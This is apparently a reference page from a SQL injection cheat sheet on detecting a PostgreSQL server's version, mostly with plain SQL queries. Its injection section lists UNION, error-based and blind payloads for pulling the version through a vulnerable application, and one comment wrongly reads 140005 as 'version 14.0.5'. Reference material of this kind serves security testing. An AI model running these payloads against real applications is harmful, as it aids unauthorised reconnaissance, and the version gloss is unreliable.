---
title: Testing Version
description: Techniques for determining PostgreSQL version information
category: Reconnaissance
order: 5
tags: ["version", "reconnaissance"]
lastUpdated: 2025-12-07
---

## Determining PostgreSQL Version

Knowing the PostgreSQL version helps identify available features and potential vulnerabilities.

### Using Version Function

The primary method for getting version information:

```sql
SELECT version();
```

Example output:

```text
PostgreSQL 14.5 on x86_64-pc-linux-gnu, compiled by gcc (GCC) 11.2.0, 64-bit
```

### Alternative Version Methods

```sql
-- Get just the version number
SELECT current_setting('server_version');

-- Get numeric version for comparisons
SELECT current_setting('server_version_num');
-- Returns: 140005 (for version 14.0.5)

-- Show server version
SHOW server_version;

-- Show numeric version
SHOW server_version_num;
```

### Version in Injection Context

```sql
-- UNION-based
' UNION SELECT NULL,version(),NULL--

-- Error-based (force version into error message)
' AND 1=CAST(version() AS int)--

-- Blind injection (character by character)
' AND SUBSTRING(version(),1,1)='P'--
```

### Extracting Version Details

```sql
-- Full version string
SELECT version();

-- Just the PostgreSQL version number
SELECT split_part(version(), ' ', 2);

-- Check if version is greater than specific value
SELECT CASE WHEN current_setting('server_version_num')::int > 100000
       THEN 'Version 10+'
       ELSE 'Version < 10' END;
```

### Version-Specific Features

| Feature             | Minimum Version |
| ------------------- | --------------- |
| `pg_sleep()`        | 8.2+            |
| `generate_series()` | 8.0+            |
| `string_agg()`      | 9.0+            |
| `json` support      | 9.2+            |
| `jsonb` support     | 9.4+            |
| `pg_read_file()`    | 8.1+            |

### Notes

- The `version()` function always returns the PostgreSQL version string
- The version string includes OS and compiler information
- Version detection is useful for identifying available functions and potential CVEs
